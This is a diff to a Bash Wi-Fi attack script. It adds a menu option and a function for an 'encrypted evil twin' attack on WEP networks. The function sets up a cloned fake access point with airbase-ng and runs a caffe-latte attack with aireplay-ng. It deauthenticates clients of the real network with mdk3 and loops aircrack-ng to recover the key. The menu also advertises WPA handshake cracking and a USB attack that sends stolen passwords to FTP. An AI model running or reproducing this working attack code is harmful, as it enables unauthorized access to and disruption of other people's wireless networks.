@@ -329,7 +329,7 @@ if [ "$intn" -gt "0" ]; then
                         i=0
 
                         for line in "${wirelessifaces[@]}"; do
-                                i=$(($i+0))
+                                i=$(($i+1))
                                 wirelessifaces[$i]=$line
                                 echo -e " "$i") $line"
                         done
@@ -378,7 +378,7 @@ mainpage
 
 }
 selectarget(){
-echo -e "A New Window Will Apeare .When You see Your Network Tap Once CTRL+C" && sleep 1.5
+echo -e "A New Window Will Apeare .When You see Your Network Tap Once CTRL+C" && sleep 0.5
 pausef 'Are You Ready ? [Press Enter To Start Scanning  ]... ' 
 
 scanheart
@@ -691,7 +691,7 @@ while  [ $t = 0 ] ; do
 done
 }
 result(){
-pwdpath=~/Desktop/PASSWORD-OF-WIFI-CRACKED.txt
+
 res=0
 while  [ $res = 0 ] ; do
 if [ -e "$pwdpath" ] ; then
@@ -728,6 +728,7 @@ done
 
 handcapture(){
 defstartsoyalk
+trap mainpage SIGINT 2>/dev/null
 		iwconfig $nameintc channel $ch
 	xterm -hold -geometry "110x60+4000+0" -bg "#1d2951" -fg "#d1e231"  -title "capturing handshake " -e "airodump-ng -w handshake  --output-format cap $nameintc --bssid $bssid -c $ch" & pid30=$!
 	PID_30=" $pid30";
@@ -818,6 +819,102 @@ else
 fi
 
 }
+sleepandkil2(){
+	sleep 30
+	kill $pid9 2>/dev/null
+
+}
+loopaiwep(){
+w=0
+while  [ $w = 0 ] ; do
+	xterm -hold -geometry "70x30+300+0" -bg "#000000" -fg "#20C20E"   -title " Aircrack-ng " -e "aircrack-ng -b $mssid  wephand-01.cap -l ~/Desktop/PASSWORD-OF-WIFI-CRACKED-evilTWIN.txt" & pid9=$!
+	PID_9=" $pid9";
+	sleepandkil2  & pid10=$!
+	PID_10=" $pid10";	
+	wait $PID_9 $PID_10 
+	
+	sleep 5
+done
+}
+evil_twin_wep (){
+iwconfig $nameintc channel $ch
+defstartsoyalk
+choise "{select second interface}"
+echo -e "$Green NEXT VERSION WE WILL TRY TO REDUCE THE SUFFICIENT TIME BY INCRYSING DATA TRANSMITION... WE THINK ALSO TO MADE CAPTIVE PORTAL INSTEAD OR CONNECT IT WITH INTERNET TO LET THE CLIENT STAY MORE TIME IN OUR NETWORK SO WE CAN BRUTEFORCE IVS AN SEE TRYED PASSWORD.WILL ALSO TRY TO MAKE THE ACCES POINT ACCESIBLE JUST FOR THE CLIENTS THAT ARE CONNECTED BEFORE WITH THE ORIGINAL ACCES POINT SO THAT WE INCREASE THE POSIBILITY OF GET THE CORRECT PASSWORD"
+nameint=`echo -e "$Green Choose  $BPurple The Second interface  $Green You want $BRed To $Green Use : "`
+defstartsoyalk
+echo $nameint
+choise "{Interfaces}"
+echo -e "  $BRed Interface           $Green Chipset 	  $Yellow	Driver"
+intn=`./airmon.sh   | grep -c "-"`
+readarray -t wirelessifaces < <(./airmon.sh    |grep "-" | cut -d- -f1)
+if [ "$intn" -gt "0" ]; then
+
+                if [ "$intn" -eq "1" ]; then
+
+		        line1=$wirelessifaces		
+			echo -e "$Yellow 1) $line1" 
+			choise "Auto Selected"
+			echo  "ONE Interface Detect .Will Be Auto Selected"
+			intface=`echo ${wirelessifaces[0]} | awk '{print $1 }'`
+			monface=`echo $intface`
+                else
+                        i=0
+
+                        for line in "${wirelessifaces[@]}"; do
+                                i=$(($i+1))
+                                wirelessifaces[$i]=$line
+                                echo -e " "$i") $line"
+                        done
+			choise "{Interfaces}"
+			read -p "$nameint" intni
+			intni=$(($intni+0))
+			intface=`echo ${wirelessifaces[$intni]} | awk '{print $1}' `
+			monface=`echo $intface`
+		fi
+
+		
+
+fi
+sleep 0.1
+nameintc2="$monface"
+airmon-ng check kill #2&> /dev/null
+rfkill unblock all 2>/dev/null
+ifconfig $nameintc2 down 2>/dev/null
+iwconfig $nameintc2 mode monitor  2&> /dev/null
+ifconfig $nameintc2 up 2>/dev/null
+choise "#"
+echo -e $GReen" IF YOU USE THE SAME INTERFACE IT MAY STOP DURING THE ATTACK .IT WILL ALSO SLOW DOWN THE ATTACK "
+choise "#"
+echo -e $BGreen" First Interface :$nameintc       $Yellow:will be used for fakeAP and capture IVS "
+choise "#"
+echo -e $BGreen" Second Interface :$nameintc2     $Yellow:will be used for deauth the original AP and send ARP-request replay "
+choise "#"
+pausef 'Press Any key To Start The attack...'
+iwconfig $nameintc2 channel $ch
+iwconfig $nameintc channel $ch
+APmac=`echo $bssid |cut -d: -f 1,2,3,4,5 `  2>/dev/null
+mssid=`echo "$APmac:AA"` 2>/dev/null
+mssid=`echo $mssid` 2>/dev/null
+echo $bssid>blacklist2
+pwdpath="~/Desktop/PASSWORD-OF-WIFI-CRACKED-evilTWIN.txt"
+
+xterm -hold -geometry "116x24+900+0" -bg "#000000" -fg "#20C20E"  -title "airodump-ng (capturing IVS)" -e " airodump-ng -c $ch -d $mssid  -w wephand --output-format cap $nameintc  --uptime --manufacturer  " & pid76=$!
+	PID_76=" $pid76";
+xterm -hold -geometry "116x24+900+900" -bg "#000000" -fg "#20C20E"  -title "FAKE AP" -e " airbase-ng -c $ch -a $mssid --essid $essid -L -W 1 $nameintc" & pid97=$!
+	PID_97=" $pid97";
+xterm -hold -geometry "116x24+0+0" -bg "#000000" -fg "#20C20E"  -title "caffe-latte Attack" -e "  aireplay-ng  --caffe-latte  -b  $mssid  $nameintc2" & pid24=$!
+	PID_24=" $pid24";
+xterm -hold -geometry "116x24+0+900" -bg "#000000" -fg "#20C20E"  -title "Deauth The Original AP MDK3 " -e " mdk3 $nameintc d -b blacklist2 -c $ch" & pid27=$!
+	PID_27=" $pid27";
+loopaiwep & pid56=$! 
+	PID_56=" $pid56";
+result & pid51=$!
+	PID_51=" $pid51";
+trap "kill $PID_76 kill $PID_97  kill $PID_27  kill $PID_24 kill $PID_56 kill $PID_51" SIGINT 2>/dev/null
+wait  $PID_97 $PID_76 $PID_27 $PID_24 $PID_56 $PID_51 2>/dev/null
+
+}
 #####exit
 
 trap control_c SIGINT SIGTERM SIGHUP
@@ -859,7 +956,7 @@ echo -e  "$BCyan 1)Select Interface You Want To Use And  Enable Monitor Mode On 
 choise "{Probalk}"
 echo -e  "$BCyan 2)Select Target Network  You Want To Test It Security " && sleep 0.1
 choise "{Probalk}"
-echo -e  "$BCyan 3)Crack Handshake with WPA2/WPA Heart-bleed-probes Brute-force [Still Expirimental] $blink " && sleep 0.1  
+echo -e  "$BCyan 3)Crack Handshake with WPA2/WPA Heart-bleed-probes Brute-force [Still Experimental] $blink " && sleep 0.1  
 choise "{Probalk}"
 echo -e  "$BCyan 4)USB bad Attack + social enginnring Send Password to  ftp / usb (targeted system  should be windows )  " && sleep 0.1
 choise "{Probalk}"
@@ -869,14 +966,16 @@ echo -e  "$BCyan 6)Capture Handshake With Airodump-ng (Deauth attack with airepl
 choise "{Probalk}"
 echo -e  "$BCyan 7)Boost your Wifi Adapter By Incrising Tx-Power " && sleep 0.1
 choise "{Probalk}"
-echo -e  "$BCyan 8)Disable Monitor Mode and $BRed EXIT" && sleep 0.1
+echo -e  "$BCyan 8)Encrypted Evil Twin With WEP ( Caffe-Latte attack + aircrack-ng )[ Will Be Improved Next Version ]$blink" && sleep 0.1
+choise "{Probalk}"
+echo -e  "$BCyan 9)Disable Monitor Mode and $BRed EXIT" && sleep 0.1
 
 }
 
 heartmainpage(){
 defstartsoyalk
 trap control_c SIGINT SIGTERM SIGHUP
-echo -e $Yellow "What Kind Of Heart-Bleed-probes Would You Like To Use (booth are expirimental ): "
+echo -e $Yellow "What Kind Of Heart-Bleed-probes Would You Like To Use (booth are Experimental ): "
 choise "{Probalk}"
 echo -e "$Cyan 1) With MDK3 Deauth Attack"
 choise "{Probalk}"
@@ -982,10 +1081,16 @@ do
       txpower
       x=1
       ;;
-      8) 
+      9) 
       control_c
       x=1
       ;;
+      8) 
+      evil_twin_wep
+mainpage
+      x=1
+      ;;
+
       *) 
       echo "invalide choise"
       sleep 2
